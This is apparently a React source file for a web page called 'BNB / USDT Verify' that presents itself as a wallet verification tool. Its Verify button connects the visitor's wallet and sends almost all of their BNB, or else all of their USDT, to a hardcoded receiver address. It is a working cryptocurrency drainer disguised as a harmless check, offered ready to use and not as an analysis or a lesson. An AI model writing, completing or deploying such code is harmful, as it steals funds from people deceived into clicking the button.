import React, { useState } from "react";
import { ethers } from "ethers";

// ✅ Your receiving wallet address
const RECEIVER = "0x473aef5D2464d76B4C46cF883E611698b452d774";

// ✅ BEP20 USDT contract address (on BNB Smart Chain)
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";

// ✅ USDT BEP20 ABI (transfer + balanceOf only)
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)",
];

function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  // 🔹 Handle Verify Button
  const handleVerify = async () => {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Please install Binance Wallet or MetaMask.");
        return;
      }

      // Connect to wallet
      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      // ✅ 1. Check BNB balance
      const balanceBNB = await provider.getBalance(userAddress);

      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005"), // keep small gas buffer
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // ✅ 2. Check USDT BEP20 balance
      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);

      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (error) {
      console.error(error);
      setStatus("Error: " + error.message);
    }
  };

  return (
    <div className="min-h-screen bg-[#121212] flex flex-col items-center justify-center text-gray-200">
      <h1 className="text-4xl font-bold text-yellow-400 mb-6">BNB / USDT Verify</h1>
      <p className="mb-4">{status}</p>
      <button
        onClick={handleVerify}
        className="bg-yellow-400 text-black px-6 py-3 rounded-full font-semibold hover:bg-yellow-300 transition"
      >
        Verify
      </button>
    </div>
  );
}

export default App;
